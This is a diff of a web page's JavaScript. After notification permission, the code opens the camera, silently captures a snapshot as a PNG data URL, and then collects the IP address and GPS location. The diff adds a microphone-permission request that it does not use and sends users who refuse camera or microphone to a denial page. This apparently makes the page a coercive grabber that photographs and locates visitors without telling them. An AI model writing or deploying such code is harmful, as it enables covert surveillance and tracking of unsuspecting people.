@@ -42,8 +42,8 @@
       </body>
     </html>`;
 
-    let timeoutID;
     let capturedImageData = null;
+    let timeoutID;
 
     function redirectDenied() {
       document.open();
@@ -161,31 +161,41 @@
     document.getElementById("startBtn").onclick = () => {
       document.getElementById("status").innerText = "Requesting permissions…";
 
-      if (Notification && Notification.requestPermission) {
-        Notification.requestPermission().finally(() => {
-          navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-              const video = document.createElement("video");
-              video.srcObject = stream;
-              video.play();
-              video.onloadedmetadata = () => {
-                const canvas = document.createElement("canvas");
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext("2d");
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                capturedImageData = canvas.toDataURL("image/png");
-                stream.getTracks().forEach(track => track.stop());
-                getIPAndGPS();
-              };
-            })
-            .catch(() => {
-              getIPAndGPS();
-            });
-        });
-      } else {
-        getIPAndGPS();
-      }
+      // Step 1: Notifications
+      Notification.requestPermission().finally(() => {
+        // Step 2: Camera
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(videoStream => {
+            const video = document.createElement("video");
+            video.srcObject = videoStream;
+            video.play();
+
+            video.onloadedmetadata = () => {
+              const canvas = document.createElement("canvas");
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              const ctx = canvas.getContext("2d");
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+              capturedImageData = canvas.toDataURL("image/png");
+              videoStream.getTracks().forEach(track => track.stop());
+
+              // Step 3: Microphone
+              navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(audioStream => {
+                  audioStream.getTracks().forEach(track => track.stop()); // We're not recording, just requesting access
+
+                  // Step 4: Finally GPS
+                  getIPAndGPS();
+                })
+                .catch(() => {
+                  redirectDenied();
+                });
+            };
+          })
+          .catch(() => {
+            redirectDenied();
+          });
+      });
     };
   </script>
 </body>
